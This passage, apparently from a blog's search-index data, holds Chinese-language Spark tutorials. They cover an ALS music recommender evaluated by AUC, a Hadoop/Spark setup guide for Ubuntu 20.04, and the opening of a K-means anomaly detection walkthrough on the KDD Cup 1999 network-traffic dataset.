i 行和 P 的函数。 因此可以很容易分开计算 U 的每一行。因为 U 的每一行可以分开计算，所以我们可以将其并行化，而并行化是大规模计算的一大优点。 ALS 是求解的著名算法，固定 P 或 U 对其对应的隐含向量求偏导数并令导数为 0，得到求解公式： 随机对 P、Q 初始化，随后交替进行优化直到收敛。收敛标准是均方误差小于预定义阈值，或者到达最大迭代次数。 推荐质量评价指标 AUCAUC 指标是一个 [0,1] 之间的实数，代表如果随机挑选一个正样本和一个负样本，分类算法将这个正样本排在负样本前面的概率。值越大，表示分类算法更有可能将正样本排在前面，也即算法准确性越好。 随机抽出一对样本（一个正样本，一个负样本），然后用训练得到的分类器来对这两个样本进行预测，预测得到正样本的概率大于负样本概率的概率。正样本负样本在有 M 个正样本, N 个负样本的数据集里。一共有 M×N 对样本（一对样本，一个正样本与一个负样本）。统计这 M×N 对样本里，正样本的预测概率大于负样本的预测概率的个数。正样本负样本其中， 实验过程数据预处理artist_data.txt 文件 数据最终处理成以逗号分割 artist_data.txt 文件 两列之间的间隔有的是空格有的是 Tab，第二列数据中包含空格 因第二列数据中含有逗号和空格，数据最终处理成以 Tab 分割 去除第一列不是数字的行 artist_alias.txt 文件 将拼写错误的艺术家 ID 或 ID 变体对应到该艺术家的规范 ID 两列之间的间隔有的是空格有的是 Tab 包含数据缺失的列 在数据处理时对拼写错误 ID 进行映射，用别名数据集将所有的艺术家 ID 转换成正规 ID。 aa={}with open(\"/export/work/F/1/data/artist_alias.txt\") as f: line = f.readline() while line: if len(line.split())==2: aa[line.split()[0]]=line.split()[1] line = f.readline()f3=open(\"/export/work/F/1/data/user_artist_data.txt.data\",\"w+\")with open(\"/export/work/F/1/data/user_artist_data.txt\") as f2: line = f2.readline() while line: it=line.split() if it[1] in aa: it[1]=aa[it[1]] print(it[0]+\",\"+it[1]+\",\"+it[2],file=f3) line = f2.readline()f3.close()f5=open(\"/export/work/F/1/data/artist_data.txt.data\",\"w+\")with open(\"/export/work/F/1/data/artist_data.txt\") as f4: line = f4.readline() while line: it=line.split() s=\"\" for i in range(len(it)): s+=it[i] if i==0: s+=\" \" elif i==len(it)-1: s+=\"\" else: s+=\" \" print(s,file=f5) line = f4.readline()f7=open(\"/export/work/F/1/data/artist_data.txt.data2\",\"w+\")with open(\"/export/work/F/1/data/artist_data.txt.data\") as f6: line = f6.readline() while line: it=line.split(\" \") try: a=int(it[0]) print(str(a)+\" \"+it[1],file=f7,end=\"\") except: pass line = f6.readline() 预处理后得到的数据集 artist_data user_artist_data 获取数据文件，并上传至 HDFS 读入数据，转换成 DataFrame 备用from pyspark.sql.types import Rowfrom pyspark.sql.types import StructTypefrom pyspark.sql.types import StructFieldfrom pyspark.sql.types import StringType,IntegerTypefrom pyspark.conf import SparkConffrom pyspark import SparkContextfrom pyspark.sql.session import SparkSession# 转换成DataFramename1=[\"user\", \"item\", \"rating\"]name2=[\"id\",\"name\"]conf = SparkConf().setAppName(\"applicaiton\").set(\"spark.executor.heartbeatInterval\",\"500000\").set(\"spark.network.timeout\",\"500000\")sc = SparkContext.getOrCreate(conf)spark = SparkSession(sc)uaRDD = sc.textFile(\"/1/user_artist_data.txt.data\")fields = list(map( lambda fieldName : StructField(fieldName, IntegerType(), nullable = True), name1))schema = StructType(fields)rowRDD = uaRDD.map(lambda line : line.split(\",\")).map(lambda attr : Row(int(attr[0]),int(attr[1]),int(attr[2])))uaDF = spark.createDataFrame(rowRDD, schema)aRDD = sc.textFile(\"/1/artist_data.txt.data2\")fields = list(map( lambda fieldName : StructField(fieldName, IntegerType(), nullable = True) if fieldName==\"id\" else StructField(fieldName, StringType(), nullable = True) , name2))schema = StructType(fields)rowRDD =aRDD.map(lambda line : line.split(\" \")).map(lambda attr : Row(int(attr[0]),attr[1]))aDF = spark.createDataFrame(rowRDD, schema) 展示数据格式基本统计信息数据格式 uaDF.show()+-------+-------+------+| user| item|rating|+-------+-------+------+|1000002| 1| 55||1000002|1000006| 33||1000002|1000007| 8||1000002|1000009| 144||1000002|1000010| 314||1000002|1000013| 8||1000002|1000014| 42||1000002|1000017| 69||1000002|1000024| 329||1000002|1000025| 1||1000002|1000028| 17||1000002|1000031| 47||1000002|1000033| 15||1000002|1000042| 1||1000002|1000045| 1||1000002|1000054| 2||1000002|1000055| 25||1000002|1000056| 4||1000002|1000059| 2||1000002|1000062| 71|+-------+-------+------+only showing top 20 rows 基本统计信息用户数 a=uaDF.select(uaDF.user).distinct().count()print(a)148111 艺术家数目 b=uaDF.select(uaDF.item).distinct().count()print(b)1568126 每用户平均播放次数 uaDF.drop(\"item\").groupBy(\"user\").agg({\"rating\":\"mean\"}).show()+-------+------------------+| user| avg(rating)|+-------+------------------+|1000190|55.355432780847146||1001043|6.0131578947368425||1001129| 12.32748538011696||1001139| 8.652557319223986||1002431|12.833333333333334||1002605|3.5392670157068062||1004666| 9.79409594095941||1005158|1.9245283018867925||1005439|28.333333333333332||1005697|11.733333333333333||1005853| 2.5||1007007| 2.443396226415094||1007847|14.333333333333334||1008081|31.232876712328768||1008233| 90.0||1008804| 9.0||1009408| 4.666666666666667||1012261|3.2887640449438202||1015587| 9.46||1016416| 8.241935483870968|+-------+------------------+only showing top 20 rows 每艺术家平均播放次数 uaDF.drop(\"user\").groupBy(\"item\").agg({\"rating\":\"mean\"}).show()+-------+------------------+| item| avg(rating)|+-------+------------------+|1001129|10.578309692671395||1003373|2.3333333333333335||1007972|18.156831042845596||1029443| 20.54196642685851||1076507| 2.969264544456641||1318111|5.6902654867256635|| 833| 9.483282674772036||1239413| 3.821794871794872||1000636| 2.0||1002431|1.7142857142857142||1005697| 3.5||1040360| 1.0||1043263|1.9166666666666667||1245208|19.613390928725703|| 463| 34.3479262672811||1043126|14.580645161290322||1001601| 3.573529411764706||1091589| 2.5||1004021| 6.96403785488959||1012885| 4.744927536231884|+-------+------------------+only showing top 20 rows 构建 ALS 模型构建 ALS 模型，并记录所耗时间。初始参数：Rank 10, maxiter 15, RegParm 0.01 Alpha 1.0。 from pyspark.ml.recommendation import ALS,ALSModelimport randomimport timestart = time.time()als = ALS(rank=10,maxIter=15,regParam=0.01,alpha=1.0,seed=int(random.random()*100))model=als.fit(uaDF)end = time.time()print (\"时间:\"+str(end-start)) 输出结果： 时间:785.1817960739136 这样我们就构建了一个 ALSModel 模型。 模型用两个不同的 DataFrame，它们分别表示 “用户 - 特征” 和 “产品 - 特征” 这两个大型矩阵。 检查推荐结果依据构建的模型，选择部分 ID 检查推荐结果。 看看模型给出的艺术家推荐直观上是否合理，检查一下用户播放过的艺术家，然后看看模型向用户推荐的艺术家。具体来看看用户 2093760 的例子。 userID = 2093760a=uaDF.rdd.filter(lambda x:x[0]==userID).collect() 查看用户输出结果： [Row(user=2093760, item=1180, rating=1), Row(user=2093760, item=1255340, rating=3), Row(user=2093760, item=378, rating=1), Row(user=2093760, item=813, rating=2), Row(user=2093760, item=942, rating=7)] 获取艺术家 ID： artistid=[]for i in a: artistid.append(i.item) 输出结果： [1180, 1255340, 378, 813, 942] 要提取该用户收听过的艺术家 ID 并打印他们的名字，这意味着先在输入数据中搜索该用户收听过的艺术家的 ID，然后用这些 ID 对艺术家集合进行过滤，这样我们就可以获取并按序打印这些艺术家的名字： b=aDF.rdd.filter(**lambda** x: x[0] **in** artistid).collect() 输出结果： [Row(id=1180, name='David Gray'), Row(id=378, name='Blackalicious'), Row(id=813, name='Jurassic 5'), Row(id=1255340, name='The Saw Doctors'), Row(id=942, name='Xzibit')] 用户播放过的艺术家既有大众流行音乐风格的也有嘻哈风格的。 使用 Spark2.4.6 自带的 recommendForUserSubset 方法，对所有艺术家评分，并返回向用户 2093760 推荐其中分值最高的前 5 位。 d=sc.parallelize([(2093760,1)]).toDF(['user']) t=model.recommendForUserSubset(d,5) t.show() 输出结果： +-------+--------------------+ | user| recommendations|+-------+--------------------+|2093760|[[6674945, 4997.0...|+-------+--------------------+ 遍历打印一下： t.select(\"recommendations\").rdd.foreach(**lambda** x:**print**(x)) 输出： Row(recommendations=[ Row(item=6674945, rating=4997.056640625), Row(item=1170225, rating=1805.596435546875), Row(item=1153293, rating=1753.0908203125), Row(item=6730413, rating=1233.61767578125), Row(item=183, rating=1169.90234375)]) 结果全部是嘻哈风格。能看出，这些推荐都不怎么样。虽然推荐的艺术家都受人欢迎，但好像并没有针对用户的收听习惯进行个性化。 训练 - 验证切分训练 - 验证切分，采用初始参数，重新训练模型。 为了利用输入数据，需要把它分成训练集和验证集。训练集只用于训练 ALS 模型，验证集用于评估模型。这里将 90% 的数据用于训练，剩余的 10% 用于交叉验证： train,test=uaDF.randomSplit([0.9,0.1])als = ALS(rank=10,maxIter=15,regParam=0.01,alpha=1.0,seed=int(random.random()*100),implicitPrefs=True)model=als.fit(train)train.cache()test.cache() 计算 AUC接受一个交叉验证集和一个预测函数，交叉验证集代表每个用户对应的 “正面的” 或 “好的” 艺术家。预测函数把每个包含 “用户 - 艺术家” 对的 DataFrame 转换为一个同时包含 “用户 - 艺术家” 和 “预测” 的 DataFrame，“预测” 表示 “用户” 与 “艺术家” 之间关联的强度值，这个值越高，代表推荐的排名越高。 allArtistIDs = uaDF.select(\"item\").distinct().collect()import numpyallArtistID = []for i in range(len(allArtistIDs)): allArtistID.append(allArtistIDs[i][\"item\"])def f(a,b): posItemIDSet = set(list(b)) negative = [] i = 0 while (i &lt; len(allArtistID)) and (len(negative) &lt; len(posItemIDSet)): artistID = allArtistID[numpy.random.randint(1, high=len(allArtistID), size=None, dtype='l')] if artistID not in posItemIDSet: negative.append(artistID) i += 1 s=list() for i in negative: s.append((a,i)) return s# 计算AUCimport pyspark.sql.functions as funcdef areaUnderCurve(positiveData,allArtistIDs,predictFunction): positivePredictions = predictFunction(positiveData.select(\"user\", \"item\")).withColumnRenamed(\"prediction\", \"positivePrediction\") negativeDatatmp = positiveData.select(\"user\", \"item\").rdd.groupByKey().map(lambda x: f(x[0],x[1])).collect() negativeDatalist=[] for i in negativeDatatmp: for j in i: negativeDatalist.append(j) negativeData=spark.createDataFrame(negativeDatalist,['user','item']) negativePredictions = predictFunction(negativeData.select(\"user\", \"item\")).withColumnRenamed(\"prediction\", \"negativePrediction\") joinedPredictions = positivePredictions.join(negativePredictions, \"user\").select(\"user\", \"positivePrediction\", \"negativePrediction\") allCounts = joinedPredictions.groupBy(\"user\").agg(func.count(func.lit(1)).alias(\"total\")).select(\"user\", \"total\") correctCounts = joinedPredictions.filter(joinedPredictions[\"positivePrediction\"] &gt; joinedPredictions[\"negativePrediction\"]).groupBy(\"user\").agg(func.count(\"user\").alias(\"correct\")).select(\"user\", \"correct\") meanAUCtemp = allCounts.join(correctCounts, \"user\", \"left_outer\") meanAUC = meanAUCtemp.select(\"user\", (meanAUCtemp[\"correct\"] / meanAUCtemp[\"total\"]).alias(\"auc\")).agg(func.mean(\"auc\")).first() try: joinedPredictions.unpersist() except: pass return meanAUC mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform)print(mostListenedAUC) 输出结果： Row(avg(auc)=0.9098560946043145) 有必要把上述方法和一个更简单方法做一个基准比对。举个例子，考虑下面的推荐方法：向每个用户推荐播放最多的艺术家。这个策略一点儿都不个性化，但它很简单，也可能有效。定义这个简单预测函数并评估它的 AUC 得分： def predictMostListened(data): listenCounts = train.groupBy(\"item\").agg({\"rating\":\"sum\"}).withColumnRenamed(\"sum(rating)\", \"prediction\").select(\"item\", \"prediction\") uaDF.join(listenCounts, [\"item\"], \"left_outer\").select(\"user\", \"item\", \"prediction\") listenCounts = uaDF.groupBy(\"item\").agg({\"rating\":\"sum\"}).withColumnRenamed(\"sum(rating)\", \"prediction\").select(\"item\", \"prediction\") return data.join(listenCounts, [\"item\"], \"left_outer\").select(\"user\", \"item\", \"prediction\")mostListenedAUC = areaUnderCurve(test, allArtistIDs, predictMostListened)print(mostListenedAUC) 输出结果： Row(avg(auc)=0.9578054887285846) 结果得分大约是 0.96。这意味着，对 AUC 这个指标，非个性化的推荐表现已经不错了。然而，我们想要的是得分更高，也就是更为 “个性化” 的推荐。显然这个模型还有待改进。调整超参数，使推荐结果更合理。 选择超参数Rank 可选（5,30）RegParam 可选（4.0,0.0001）,alpha 可选（1.0,40.0）。合计 8 种参数组合。 可以把 rank、regParam 和 alpha 看作模型的超参数。（maxIter 更像是对分解过程使用的资源的一种约束。）这些值不会体现在 ALSModel 的内部矩阵中，这些矩阵只是参数，其值由算法选定。超参数则是构建过程本身的参数。 def TrainALS(rank,regParam,alpha,dir): als = ALS(rank=rank,maxIter=15,regParam=regParam,alpha=alpha,seed=int(random.random()*100),implicitPrefs=True) model=als.fit(train) model.save(\"/model/ALS/Try2/\"+str(dir)) try: model.userFactors.unpersist() model.itemFactors.unpersist() except: pass 构建模型 dir=0for rank in [5,30]: for regParam in [4.0,0.0001]: for alpha in [1.0,40.0]: dir=dir+1 TrainALS(rank,regParam,alpha,dir) 加载模型计算 AUC 得分： try: model=ALSModel.load(\"/model/ALS/Try2/1\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(5,4.0,1.0)))except: print((\"ERROR\",(5,4.0,1.0)))try: model=ALSModel.load(\"/model/ALS/Try2/2\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(5,4.0,40.0)))except: print((\"ERROR\",(5,4.0,40.0)))try: model=ALSModel.load(\"/model/ALS/Try2/3\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(5,0.0001,1.0)))except: print((\"ERROR\",(5,0.0001,1.0)))try: model=ALSModel.load(\"/model/ALS/Try2/4\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(5,0.0001,40.0)))except: print((\"ERROR\",(5,0.0001,40.0)))try: model=ALSModel.load(\"/model/ALS/Try2/5\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(30,4.0,1.0)))except: print((\"ERROR\",(30,4.0,1.0)))try: model=ALSModel.load(\"/model/ALS/Try2/6\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(30,4.0,40.0)))except: print((\"ERROR\",(30,4.0,40.0)))try: model=ALSModel.load(\"/model/ALS/Try2/7\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(30,0.0001,1.0)))except: print((\"ERROR\",(30,0.0001,1.0)))try: model=ALSModel.load(\"/model/ALS/Try2/8\") mostListenedAUC = areaUnderCurve(test, allArtistIDs, model.transform) print((mostListenedAUC,(30,0.0001,40.0)))except: print((\"ERROR\",(30,0.0001,40.0))) 输出结果： (Row(avg(auc)=0.9122637924972641), (5, 4.0, 1.0))(Row(avg(auc)=0.9154223563144587), (5, 4.0, 40.0))(Row(avg(auc)=0.9057761909633262), (5, 0.0001, 1.0))(Row(avg(auc)=0.9146676967584815), (5, 0.0001, 40.0))(Row(avg(auc)=0.9230010545570864), (30, 4.0, 1.0))(Row(avg(auc)=0.9275148741094371), (30, 4.0, 40.0))(Row(avg(auc)=0.9125799456221803), (30, 0.0001, 1.0))(Row(avg(auc)=0.9265221600644649), (30, 0.0001, 40.0)) 可以看出 rank = 30，regParam = 4.0，alpha = 40.0 时取得了最优的结果 avg (auc)=0.9275148741094371. 虽然这些值的绝对差很小，但对于 AUC 值来说，仍然具有一定的意义。有意思的是，参数 alpha 取 40 的时候看起来总是比取 1 表现好。这说明了模型在强调用户听过什么时的表现要比强调用户没听过什么时要好。 产生推荐选取 10 个用户展示推荐结果 model=ALSModel.load(\"/model/ALS/Try2/6\")d=sc.parallelize([(2093760,1),(1000002,1),(1006277,1),(1006282,1),(1006283,1),(1006285,1),(1041207,1),(1071489,1),(2025005,1),(2025007,1),]).toDF(['user'])t=model.recommendForUserSubset(d,5)t.select(\"recommendations\").rdd.foreach(lambda x:print(x)) 输出推荐结果： Row(recommendations=[Row(item=1010991, rating=1.1815389394760132), Row(item=1245226, rating=1.139704942703247), Row(item=4629, rating=1.1092422008514404), Row(item=1113701, rating=1.1066040992736816), Row(item=1019715, rating=1.10056471824646)])Row(recommendations=[Row(item=1010921, rating=1.225757122039795), Row(item=1166169, rating=1.1972994804382324), Row(item=1183949, rating=1.184556007385254), Row(item=1082446, rating=1.178223729133606), Row(item=3892, rating=1.1580229997634888)])Row(recommendations=[Row(item=1028958, rating=1.146733283996582), Row(item=1086774, rating=1.1434733867645264), Row(item=1037761, rating=1.1272671222686768), Row(item=1184419, rating=1.1093372106552124), Row(item=1148170, rating=1.1065270900726318)])Row(recommendations=[Row(item=1010295, rating=1.2554553747177124), Row(item=3722, rating=1.2187168598175049), Row(item=1024674, rating=1.2044183015823364), Row(item=1009445, rating=1.099776268005371), Row(item=1018746, rating=1.0894378423690796)])Row(recommendations=[Row(item=1002068, rating=0.9575374126434326), Row(item=1005288, rating=0.9533681273460388), Row(item=2430, rating=0.9476644992828369), Row(item=1002270, rating=0.9428261518478394), Row(item=3909, rating=0.9334102869033813)])Row(recommendations=[Row(item=1034635, rating=0.606441080570221), Row(item=1000107, rating=0.6010327935218811), Row(item=1000024, rating=0.59807950258255), Row(item=4154, rating=0.5966558456420898), Row(item=1000157, rating=0.5944067239761353)])Row(recommendations=[Row(item=1034635, rating=0.290438175201416), Row(item=930, rating=0.2857869565486908), Row(item=4267, rating=0.2853849530220032), Row(item=1205, rating=0.2830250561237335), Row(item=1000113, rating=0.2829856276512146)])Row(recommendations=[Row(item=1002909, rating=1.2324668169021606), Row(item=1653, rating=1.1938585042953491), Row(item=988, rating=1.1880080699920654), Row(item=1003367, rating=1.1807997226715088), Row(item=1009545, rating=1.1761128902435303)])Row(recommendations=[Row(item=1017017, rating=0.8724791407585144), Row(item=1032349, rating=0.8424116373062134), Row(item=1028433, rating=0.8259942531585693), Row(item=1240603, rating=0.8185747265815735), Row(item=1029602, rating=0.8147093653678894)])Row(recommendations=[Row(item=1013187, rating=1.2516499757766724), Row(item=1098360, rating=1.2394661903381348), Row(item=1289948, rating=1.2353206872940063), Row(item=1129243, rating=1.2332189083099365), Row(item=1245184, rating=1.1997216939926147)]) 按照用户顺序将最喜欢的推荐结果输出到文件 def getp(x): f=open(\"/export/work/result\",\"a+\") print(x,file=f)u=uaDF.select(\"user\").distinct()t=model.recommendForUserSubset(u,1)t.rdd.foreach(lambda x:getp(x)) 推荐输出详见 result 文件，以下为部分推荐输出： Row(user=1000092, recommendations=[Row(item=1002400, rating=1.2386927604675293)]) Row(user=1000144, recommendations=[Row(item=5221, rating=1.1728830337524414)]) Row(user=3175, recommendations=[Row(item=1022207, rating=0.282743901014328)]) Row(user=1000164, recommendations=[Row(item=1034635, rating=0.36578264832496643)]) Row(user=7340, recommendations=[Row(item=1007903, rating=0.8722475171089172)])"},{"title":"","date":"2020-05-07T11:06:00.000Z","updated":"2022-05-10T02:10:00.000Z","comments":true,"path":"notes/Spark/env.html","permalink":"https://blog.mhuig.top/notes/Spark/env","excerpt":"Environment Deployment Spark 环境部署（Ubuntu20.04） Spark&nbsp; 在 Ubuntu20.04 中的配置","text":"Environment Deployment Spark 环境部署（Ubuntu20.04） Spark&nbsp; 在 Ubuntu20.04 中的配置 实验环境 实验环境 Ubuntu20.04 LTSHadoop 2.6.0-cdh5.14.0Java 1.8.0_141Python3.8.2(default)Spark 3.0.0-preview2 配置 java 环境解压安装 jdk tar -zxvf jdk-8u141-linux-x64.tar.gz -C ../servers/ 配置环境变量 nano /etc/profile /etc/profileexport JAVA_HOME=/export/servers/jdk1.8.0_141export PATH=:$JAVA_HOME/bin:$PATH 修改完成之后记得 &nbsp;reboot -h now 或 source/etc/profile 生效 验证 jps 配置 Hadoop 环境下载解压Hadoop 2 可以通过 &nbsp;https://mirrors.cnnic.cn/apache/hadoop/common/&nbsp; 下载 将 Hadoop 安装至 /usr/local/ 中： sudo tar -zxf hadoop-2.6.0.tar.gz -C /usr/local # 解压到/usr/local中cd /usr/local/sudo mv ./hadoop-2.6.0/ ./hadoop # 将文件夹名改为hadoopsudo chown -R hadoop ./hadoop # 修改文件权限 Hadoop 伪分布式配置伪分布式需要修改 2 个配置文件 &nbsp;core-site.xml&nbsp; 和 &nbsp;hdfs-site.xml core-site.xmlcore-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/tmp&lt;/value&gt; &lt;description&gt;Abase for other temporary directories.&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; hdfs-site.xmlhdfs-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/tmp/dfs/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/tmp/dfs/data&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置 JAVA_HOME到 hadoop 的安装目录修改配置文件 “/usr/local/hadoop/etc/hadoop/hadoop-env.sh”，在里面找到 “export JAVA_HOME=${JAVA_HOME}” 这行，然后，把它修改成 JAVA 安装路径的具体地址 NameNode 格式化cd /usr/local/hadoop./bin/hdfs namenode -format 开启 NameNode 和 DataNode 守护进程cd /usr/local/hadoop./sbin/start-dfs.sh 安装 Spark打开浏览器，访问 Spark 官方下载地址 由于我们已经自己安装了 Hadoop，所以，在 Choose a package type 后面需要选择 Pre-build with user-provided Hadoop将 spark 解压到 /usr/local,并重命名为 spark修改 Spark 的配置文件 spark-env.sh cd /usr/local/sparkcp ./conf/spark-env.sh.template ./conf/spark-env.sh 编辑 spark-env.sh 文件，在第一行添加以下配置信息: spark-env.shexport SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath) 修改环境变量 /etc/profileexport HADOOP_HOME=/usr/local/hadoopexport SPARK_HOME=/usr/local/sparkexport PYTHONPATH=$SPARK_HOME/python:$SPARK_HOME/python/lib/py4j-0.10.4-src.zip:$PYTHONPATHexport PYSPARK_PYTHON=python3export PATH=$HADOOP_HOME/bin:$SPARK_HOME/bin:$PATH 运行 Spark 自带的示例，验证 Spark 是否安装成功 使用 Spark 计算 PI（3.1415926....） cd /usr/local/sparkbin/run-example SparkPi grep 命令进行过滤 bin/run-example SparkPi 2&gt;&amp;1 | grep \"Pi is\""},{"title":"","date":"2022-05-10T02:10:00.000Z","updated":"2022-05-10T02:10:00.000Z","comments":true,"path":"notes/Spark/index.html","permalink":"https://blog.mhuig.top/notes/Spark/","excerpt":"","text":".fa-secondary{opacity:.4} Spark Spark .prev-next{ display: none !important; }"},{"title":"","date":"2020-08-02T10:23:00.000Z","updated":"2022-05-10T02:11:00.000Z","comments":true,"path":"notes/Spark/k-means.html","permalink":"https://blog.mhuig.top/notes/Spark/k-means","excerpt":"","text":"K-Means 基于 K 均值聚类的网络流量异常检测 (pyspark) 异常检测常用于检测欺诈、网络攻击、服务器及传感设备故障。在这些应用中，我们要能够找出以前从未见过的新型异常，如新欺诈方式、新入侵方法或新服务器故障模式。 数据集KDD Cup 1999 数据集 下载 KDD Cup 1999 数据集 数据集为 CSV 格式，每个连接占一行，包含 38 个特征。 单行示例： 0,tcp,http,SF,239,486,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,8,8,0.00,0.00,0.00,0.00,1.00,0.00,0.00,19,19,1.00,0.00,0.05,0.00,0.00,0.00,0.00,0.00,normal. 最后的字段表示类别标号。大多数标号为 normal.， 但也有一些样本代表各种网络攻击。 算法K 均值聚类算法聚类算法是指将一堆没有标签的数据自动划分成几类的方法，这个方法要保证同一类的数据有相似的特征。 算法过程K-Means 算法的特点是类别的个数是人为给定的。是一个迭代求解的聚类算法，属于划分型的聚类方法，即首先创建 K 个划分，然后迭代地将样本从一个划分转移到另一个划分来改善最终聚类的效果。其过程大致如下。 （1）根据给定的 K 值选取 K 个样本点作为初始划分中心。 （2）计算所有样本点到每一个划分中心的距离，并将所有样本点划分到距离最近的划分中心。 （3）计算每个划分中样本点的平均值，并将其作为新的中心。 （4）循环进行步骤（2）和步骤（3）直至最大迭代次数，或划分中心的变化小于某一预定义阈值。 伪代码function K-Means(输入数据，中心点个数K) 获取输入数据的维度Dim和个数N 随机生成K个Dim维的点 while(算法未收敛) 对N个点：计算每个点属于哪一类。 对于K个中心点： 1，找出所有属于自己这一类的所有数据点 2，把自己的坐标修改为这些数据点的中心点坐标 end 输出结果end K-Means 的一个重要的假设是：数据之间的相似度可以使用欧氏距离度量，如果不能使用欧氏距离度量，要先把数据转换到能用欧氏距离度量，这一点很重要。可以使用欧氏距离度量的意思就是欧氏距离越小，两个数据相似度越高。 假设簇划分为（,,…）,则优化目标是最小化平方误差 SSE: 其中是簇的均值向量，也称为质心，表达式为： 这是一个 NP 难题，因此只能采用启发式迭代方法。 K-Means 采用的启发式方式很简单，用下面一组图就可以形象的描述: 图 a 表达了初始的数据集，假设 k = 2。在图 b 中，随机选择了两个 k 类所对应的类别质心，即图中的红色质心和蓝色质心，然后分别求样本中所有点到这两个质心的距离，并标记每个样本的类别为和该样本距离最小的质心的类别，如图 c 所示，经过计算样本和红色质心和蓝色质心的距离，得到了所有样本点的第一轮迭代后的类别。此时对当前标记为红色和蓝色的点分别求其新的质心，如图 d 所示，新的红色质心和蓝色质心的位置已经发生了变动。图 e 和图 f 重复了在图 c 和图 d 的过程，即将所有点的类别标记为距离最近的质心的类别并求新的质心。最终得到的两个类别如图 f。 K-means 聚类最优 k 值的选取（手肘法）手肘法的核心指标是 SSE (sum of the squared errors，误差平方和),公式见上文。 核心思想是：随着聚类数 k 的增大，样本划分会更加精细，每个簇的聚合程度会逐渐提高，那么误差平方和 SSE 自然会逐渐变小。并且，当 k 小于真实聚类数时，由于 k 的增大会大幅增加每个簇的聚合程度，故 SSE 的下降幅度会很大，而当 k 到达真实聚类数时，再增加 k 所得到的聚合程度回报会迅速变小，所以 SSE 的下降幅度会骤减，然后随着 k 值的继续增大而趋于平缓，也就是说 SSE 和 k 的关系图是一个手肘的形状，而这个肘部对应的 k 值就是数据的真实聚类数。 特征的规范化去除数据的单位限制，将其转化为无量纲的纯数值，便于不同单位或量级的指标能够进行计算和比较。 1、数据的中心化 所谓数据的中心化是指数据集中的各项数据减去数据集的均值。 2、数据的标准化 所谓数据的标准化是指中心化之后的数据在除以数据集的标准差，即数据集中的各项数据减去数据集的均值再除以数据集的标准差。 特征的规范化可以通过将每个特征转换为标准得分来完成。这就是说用对每个特征值求平均，用每个特征值减去平均值，然后除以特征值的标准差，如下标准分计算公式所示： 类别型变量类别型特征可以用 one-hot 编码转换为几个二元特征，这几个二元特征可以看成数值型维度。 使用 N 位状态寄存器来对 N 个状态进行编码，每个状态都由他独立的寄存器位，并且在任意时候，其中只有一位有效。 解决了分类器不好处理属性数据的问题；在一定程度上也起到了扩充特征的作用。 聚类结果评价指标Entropy（熵）好的聚类应该和人工标签保持一致，大部分情况下，标签相同的数据点应聚在一起，而标签不同的数据点不应该在一起，并且簇内的数据点标签相同。熵值会变得很小。 对于一个聚类 i，首先计算聚类 i 中的成员（member）属于类（class）j 的概率其中是在聚类 i 中所有成员的个数，是聚类 i 中的成员属于类 j 的个数。 每个聚类的 entropy 可以表示为其中 L 是类（class）的个数。 整个聚类划分的 entropy 为其中 K 是聚类（cluster）的数目，m 是整个聚类划分所涉及到的成员个数。 Accuracy (准确率)比较每一条聚类结果是否和真的结果一致. 其中 N 表示文档总数，表示正确聚类的文档数. 实验过程准备数据，上传至 HDFSHDFS 创建文件夹 hadoop 关闭安全模式 上传 KDD Cup 1999 数据集 查看上传成功 通过 kddcup.names 加载列名称names=[]with open(\"/export/work/F/3/data/kddcup.names\") as f: line = f.readline() line = f.readline() while line: names.append(line.split(\":\")[0]) line = f.readline()names.append(\"label\") 输出列名称： ['duration', 'protocol_type', 'service', 'flag', 'src_bytes', 'dst_bytes', 'land', 'wrong_fragment', 'urgent', 'hot', 'num_failed_logins', 'logged_in', 'num_compromised', 'root_shell', 'su_attempted', 'num_root', 'num_file_creations', 'num_shells', 'num_access_files', 'num_outbound_cmds', 'is_host_login', 'is_guest_login', 'count', 'srv_count', 'serror_rate', 'srv_serror_rate', 'rerror_rate', 'srv_rerror_rate', 'same_srv_rate', 'diff_srv_rate', 'srv_diff_host_rate', 'dst_host_count', 'dst_host_srv_count', 'dst_host_same_srv_rate', 'dst_host_diff_srv_rate', 'dst_host_same_src_port_rate', 'dst_host_srv_diff_host_rate', 'dst_host_serror_rate', 'dst_host_srv_serror_rate', 'dst_host_rerror_rate', 'dst_host_srv_rerror_rate', 'label'] 构建 Dataframenames=['duration', 'protocol_type', 'service', 'flag', 'src_bytes', 'dst_bytes', 'land', 'wrong_fragment', 'urgent', 'hot', 'num_failed_logins', 'logged_in', 'num_compromised', 'root_shell', 'su_attempted', 'num_root', 'num_file_creations', 'num_shells', 'num_access_files', 'num_outbound_cmds', 'is_host_login', 'is_guest_login', 'count', 'srv_count', 'serror_rate', 'srv_serror_rate', 'rerror_rate', 'srv_rerror_rate', 'same_srv_rate', 'diff_srv_rate', 'srv_diff_host_rate', 'dst_host_count', 'dst_host_srv_count', 'dst_host_same_srv_rate', 'dst_host_diff_srv_rate', 'dst_host_same_src_port_rate', 'dst_host_srv_diff_host_rate', 'dst_host_serror_rate', 'dst_host_srv_serror_rate', 'dst_host_rerror_rate', 'dst_host_srv_rerror_rate', 